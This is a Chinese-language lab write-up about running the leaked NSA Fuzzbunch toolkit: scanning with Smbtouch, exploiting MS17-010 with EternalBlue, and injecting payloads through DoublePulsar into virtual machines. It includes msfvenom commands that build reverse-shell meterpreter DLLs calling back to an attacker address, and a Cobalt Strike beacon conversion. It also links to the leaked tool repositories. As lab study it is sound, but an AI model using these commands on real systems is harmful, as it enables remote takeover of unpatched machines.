# 武器库历史说明

首先说明一下武器库的关系，我也理了好久。关于 shadowbroker 和 fuzzbunch。

 **|** 影子经纪（Shadow Brokers）声称攻破了为NSA开发网络武器的美国黑客团队方程式组织（Equation
Group）黑客组织的计算机系统，并下载了他们大量的攻击工具（包括恶意软件、私有的攻击框架及其它攻击工具）。  
方程式组织（Equation
Group）是一个由卡巴斯基实验室发现的尖端网络犯罪组织，后者将其称为世界上最尖端的网络攻击组织之一，同震网（Stuxnet）和火焰（Flame）病毒的制造者紧密合作且在幕后操作。

所以shadowbroker是影子组织公开的工具，其中包括了fuzzbunch&DanderSpritz，不仅如此还有其他工具：

>  **windows** ：包含Windows漏洞、后门、利用工具，等配置文件信息；
>
>  **swift** ：包含来自银行攻击的操作说；
>
>  **oddjob** ：与ODDJOB后门相关的文档。

![1647496159_6232cbdf93fb0046d5574.png!small?1647496159890](https://image.3001.net/images/20220317/1647496159_6232cbdf93fb0046d5574.png!small?1647496159890)

所以针对永恒之蓝的fuzzbunch工具包仅是沧海一粟，其中一部分。

网上的资料良莠不齐，只能自己踩坑摸索，加上最近法律颁布，以后安全圈真大变革，以后又将会何去何从。

# Fuzzbunch

这里有几个坑，由于是泄漏出来的版本，github存在极多分支，其中最主要就是shadowbroker所有工具包的和有仅有fuzzbunch。

 **shadowbroker：**

  *  _<https://github.com/x0rz/EQGRP_Lost_in_Translation>_
  *  _<https://github.com/misterch0c/shadowbroker>_ 【fuzz少组件，没跑起】

 **fuzzbunch:**

  *  _<https://github.com/fuzzbunch/fuzzbunch>_ 【暂用这个】
  *  _<https://github.com/exploitx3/FUZZBUNCH>_ 【有流程图，方便理解】

 **检测工具：**

  *  _<https://github.com/countercept/doublepulsar-detection-script>_

我在一个github找的shadowbroker工具跑的里面的buzzbunch没跑起来，原因后面找到了，是少了一些dll库，这些库还不好从网上找，还是后面另开炉灶，下了一个单独的fuzzbunch跑起的，从这目录下找到了那些遗失的windll库。

在网上也找到类似报错，不同git仓库下，确实是不同，毕竟是泄漏版本，坑是巨多。![1647496252_6232cc3c5f68fa5fd09bf.png!small?1647496252763](https://image.3001.net/images/20220317/1647496252_6232cc3c5f68fa5fd09bf.png!small?1647496252763)

## 硬性环境要求

 **Prerequisites** :

  * Windows 7以下
  * 6（必须为32位版本）和 _[pywin32](https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/pywin32-221.win32-py2.6.exe/download)_
  * 创建listeningposts目录；
  * 修改xml

按需修改Resources，logs。

 **|** 建议修改logs为c:\logs，后续很省事。

![1647496261_6232cc45de2ce563b74f1.png!small?1647496262185](https://image.3001.net/images/20220317/1647496261_6232cc45de2ce563b74f1.png!small?1647496262185)

## 功能介绍

目标识别和利用漏洞发现：

  * Architouch
  * Rpctouch
  * Domaintouch
  * Smbtouch

漏洞利用：

  * EternalBlue
  * Emeraldthread
  * Eclipsedwing
  * EternalRomance

目标攻击后后操作：

  * Douplepulsar
  * Regread
  * Regwrite

其插件主要有以下几部分：

  * Exploit 对应Windows目录下的\Exploits 目录，包括对Windows系统和应用软件的漏洞利用程序，主要是针对Windows系统SMB协议和对原Lotus （莲花公司，先已被IBM收购）邮件系统的攻击。

![1647496271_6232cc4fc5c254e043785.png!small?1647496271986](https://image.3001.net/images/20220317/1647496271_6232cc4fc5c254e043785.png!small?1647496271986)

Implant 对应Windows目录下的\implants目录，功能为向目标机器植入指定的dll或exe程序。

![1647496277_6232cc5532627b0f2155f.png!small?1647496277441](https://image.3001.net/images/20220317/1647496277_6232cc5532627b0f2155f.png!small?1647496277441)

  * Payload 对应Windows目录下的\payloads 目录，该目录中的模块插件主要用于Exploit插件模块攻击成功后，后续的执行操作插件，包括在受害者机器上安装后门、枚举进程、增删改查注册表项、RPC服务等。

![1647496283_6232cc5b95c0e5b2ce9c2.png!small?1647496283852](https://image.3001.net/images/20220317/1647496283_6232cc5b95c0e5b2ce9c2.png!small?1647496283852)

  * Speical 对应Windows目录下的\specials 目录，该目录下Eternalblue和Eternalchampion的是比较新的2个针对Windows SMB协议的利用程序，但在微软3月的补丁MS17-010中也已经修复。

![1647496290_6232cc622e5bce6a19911.png!small?1647496290345](https://image.3001.net/images/20220317/1647496290_6232cc622e5bce6a19911.png!small?1647496290345)

  * Touch 对应Windows目录下的\touches 目录，主要功能是探测是否存在指定的漏洞，和Exploit插件模块功能相似，但该部分仅仅起扫描探测的作用，不包含漏洞利用功能。

![1647496303_6232cc6f335bee127012a.png!small?1647496303452](https://image.3001.net/images/20220317/1647496303_6232cc6f335bee127012a.png!small?1647496303452)

## Smbtouch

然后我们通过使用Smbtouch使用smb协议来检测对方操作系统版本、架构、可利用的漏洞。![1647496310_6232cc7628a1e27abc6d8.png!small?1647496310621](https://image.3001.net/images/20220317/1647496310_6232cc7628a1e27abc6d8.png!small?1647496310621)

## Eternalblue

Attack (win10) : 10.211.55.8

Attack(win7)：10.211.55.9

靶机（win2k3)：10.211.55.4

攻击机不能用Win10，打不成，换win7就好使。还是win7用起来舒服，动画看的也舒服也不消耗过多cpu资源。

不会就help，打?。

use eternalblue启动。

需注意几点

1\. 这里记得选1> FB，0是生成一个dll。

![1647496336_6232cc900fc4556a23069.png!small?1647496336221](https://image.3001.net/images/20220317/1647496336_6232cc900fc4556a23069.png!small?1647496336221)

2\. 重定向那个选项也要注意，不要选yes。参照 _小丑竟是我自己_ 。

通过返回的信息,可以看出攻击成功,用了不到10秒钟的时间，攻击成功之后并不能直接执行命令,需要用框架的其他的插件配合。

 **第一次打成功的截图：**

![1647496381_6232ccbd8b24ce6057503.png!small?1647496381946](https://image.3001.net/images/20220317/1647496381_6232ccbd8b24ce6057503.png!small?1647496381946)

之后重复打就会这样。

![1647496386_6232ccc2f16af8a3d01a8.png!small?1647496387458](https://image.3001.net/images/20220317/1647496386_6232ccc2f16af8a3d01a8.png!small?1647496387458)

攻击成功之后就可以开始使用DoublePulsar插件,DoublePulsar类似于一个注入器,有以下几个功能。

Ping： 检测后门是否部署成功。

RUNDLL：注入dll。

RunShellcode：注入shellcode。

Uninstall：用于卸载系统上的后门。

# Doublepulsar

使用DoublePulsar配合上面的Eternalblue完成dll注入。

注意:msf生成的dll注入到win7进程的时候，win7可能会重启。

## MSF上线

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.211.55.15 LPORT=4444
-f dll > 4444.dll  
  
use exploit/multi/handler  
set PAYLOAD windows/x64/meterpreter/reverse_tcp  
  
use doublepulsar

Bash

第一次打失败了，弹了但是没有完全弹回。选的是SMB，x64，lsass.exe。

![1647496403_6232ccd3b70e9fcefc59f.png!small?1647496404200](https://image.3001.net/images/20220317/1647496403_6232ccd3b70e9fcefc59f.png!small?1647496404200)

 **遇到的一些问题：**

  * 发现msf的payload选错

msf反弹shell的地方没选payload，用的默认的，岂可修，已经好几次这样犯错了。可恶～！

  * 修改后再无法成功。

但我修改了之后还是没有成功，是不是之前已经注入过了，搞了没有办法重新注入。而且上面永恒之蓝的打法也是，打了一次就记住了，现在也不知道在哪删痕迹，都是陌生的一切。

莫名原因重启之后，一切重来，一切正常。

![1647496412_6232ccdc01ab15d6e2b34.png!small?1647496412271](https://image.3001.net/images/20220317/1647496412_6232ccdc01ab15d6e2b34.png!small?1647496412271)

## CS上线

但平时还是cs用得多一点。试试cs的dll效果如何。

 **|** 网上言论：“开始采用CS后门dll发现，执行使目标机器蓝屏重启几率较大，成功率较低。”

当然实际情况，内网的基本不出网，所以直接上cs不实用。还是打远程桌面比较香。

网上言论：“开始采用CS后门dll发现，执行使目标机器蓝屏重启几率较大，成功率较低。”

### cs—dll盲目操作导致报错

![1647496424_6232cce8096bee5054dd6.png!small?1647496424224](https://image.3001.net/images/20220317/1647496424_6232cce8096bee5054dd6.png!small?1647496424224)

win7只要一打cs的dll，秒报错。

![1647496430_6232ccee1f6ba1cff6a28.png!small?1647496430642](https://image.3001.net/images/20220317/1647496430_6232ccee1f6ba1cff6a28.png!small?1647496430642)

### msf转换payload

参考链接： _[http://www.dark5.net/blog/2019/06/26/Cobalt-Strike-DLL用于永恒之蓝注入/](http://www.dark5.net/blog/2019/06/26/Cobalt-Strike-DLL%E7%94%A8%E4%BA%8E%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%B3%A8%E5%85%A5/)_

msfvenom -p generic/custom PAYLOADFILE=./beacon.bin -a x64 --platform windows
-f dll -o csmsf.dll

注意cs的payload不能选windows那个，要选raw格式的dll。

### 小丑竟是我自己

打完cs之后，我发现上线的竟然是自己的攻击机Win7，我觉得不太对，IP都对着。怎么这样，重新打了一遍发现。小丑竟是我自己，自己上线自己。![1647496446_6232ccfe2d0aa9c93e2c9.png!small?1647496446408](https://image.3001.net/images/20220317/1647496446_6232ccfe2d0aa9c93e2c9.png!small?1647496446408)

![1647496448_6232cd00ac864968540cd.png!small?1647496448861](https://image.3001.net/images/20220317/1647496448_6232cd00ac864968540cd.png!small?1647496448861)

发现之前的设置当中，有这么一步设定。

![1647496455_6232cd074cd99bb531904.png!small?1647496455614](https://image.3001.net/images/20220317/1647496455_6232cd074cd99bb531904.png!small?1647496455614)

## win2k8无法上线 [没解决]

 _<https://beta.4hou.com/technology/12265.html>_

方程式可以上线，虽然报错，依旧上线。

![1647496467_6232cd13f107330e7e475.png!small?1647496468131](https://image.3001.net/images/20220317/1647496467_6232cd13f107330e7e475.png!small?1647496468131)

DllOrdinal默认值为1，ytb演示视频为5。修改也没用。

嵌入类型：
_[https://www.yxxtxbx.com/watch?v=B8kkHAa_ntk&t=248s](https://www.youtube.com/watch?v=B8kkHAa_ntk&t=248s)_

# DoubleSpritz

DanderSpritz是后渗透工具，伴随武器库一同泄漏，可配合fuzzbunch使用。

在fuzzbunch攻击成功，在受害者机器上植入木马后，可以通过DanderSpritz对受害者机器进行远控制和操作。

网上说明文档极少，都是大伙踩过坑的辛酸泪： _<https://github.com/francisck/DanderSpritz_lab>_

首先准备好合适的jdk版本环境。

 _[https://3gstudent.github.io/NSA-DanderSpiritz测试指南-木马生成与测试](https://3gstudent.github.io/NSA-DanderSpiritz%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97-%E6%9C%A8%E9%A9%AC%E7%94%9F%E6%88%90%E4%B8%8E%E6%B5%8B%E8%AF%95)_

不会，坑太多，溜了溜了。

不会，坑太多，溜了溜了。

不会，坑太多，溜了溜了。

## 17010莫名修复排查

本来一直存在17010的靶机，今天突然打不成了，我是惶恐不安呀，经过几番排查，的亏快照习惯好，恢复快照排查，发现后续安装软件的时候，存在这几个补丁。

  

![1647496487_6232cd2719116b785da80.png!small?1647496487350](https://image.3001.net/images/20220317/1647496487_6232cd2719116b785da80.png!small?1647496487350)

卸载补丁。

![1647496492_6232cd2c2015ffcd264b2.png!small?1647496492288](https://image.3001.net/images/20220317/1647496492_6232cd2c2015ffcd264b2.png!small?1647496492288)

nice，不亏耗费我快2小时，几个虚拟机疯狂调试，逐渐排查问题，关闭自动更新。over。

